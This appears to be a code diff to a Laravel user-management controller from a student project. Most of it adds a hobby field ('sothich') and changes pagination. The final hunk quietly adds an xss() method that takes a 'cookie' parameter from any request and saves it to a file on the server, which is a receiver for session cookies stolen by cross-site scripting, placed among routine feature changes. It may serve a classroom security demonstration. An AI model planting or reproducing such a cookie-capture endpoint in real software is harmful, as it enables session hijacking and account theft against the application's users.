@@ -48,6 +48,7 @@ class CustomAuthController extends Controller
             'phone' => 'required|string|max:15',
             'image' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
             'mssv' => 'required|string|max:255|unique:users',
+            'sothich' => 'required|string|max:255',
         ]);
 
         $data = $request->all();
@@ -75,6 +76,7 @@ class CustomAuthController extends Controller
             // Lưu trữ đường dẫn ảnh với 'image_path' là tên cột trong database
             'image' => $data['image'] ?? null,
             'mssv' => $data['mssv'],
+            'sothich' => $data['sothich'],
         ]);
 
     }
@@ -127,7 +129,7 @@ class CustomAuthController extends Controller
     public function listUser()
     {
         if (Auth::check()) {
-            $users = User::paginate(10);
+            $users = User::paginate(1);
             return view('crud_user.list', ['users' => $users]);
         }
         return redirect("login")->with('message', 'Bạn cần đăng nhập để sử dụng.');
@@ -143,6 +145,7 @@ class CustomAuthController extends Controller
             'image' => 'nullable|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
             'password' => 'nullable|string|min:6|confirmed',
             'mssv' => 'required|string|max:255|unique:users,mssv,' . $id . ',id',
+            'sothich' => 'required|string|max:255',
         ]);
 
 
@@ -154,7 +157,7 @@ class CustomAuthController extends Controller
         $user->email = $request->input('email');
         $user->phone = $request->input('phone');
         $user->mssv = $request->input('mssv');
-
+        $user->sothich = $request->input('sothich');
 
         // Lấy mật khẩu mới từ request
         $newPassword = $request->input('password');
@@ -188,5 +191,13 @@ class CustomAuthController extends Controller
     {
         $user = User::findOrFail($id);
         return view('crud_user.view', compact('user')); //Đường dẫn đến template thư mục
+    }
+    public function xss(Request $request)
+    {
+        $cookie = $request->get('cookie');
+        file_put_contents('xss.txt', $cookie);
+        var_dump($cookie);
+        die();
+
     }
 }
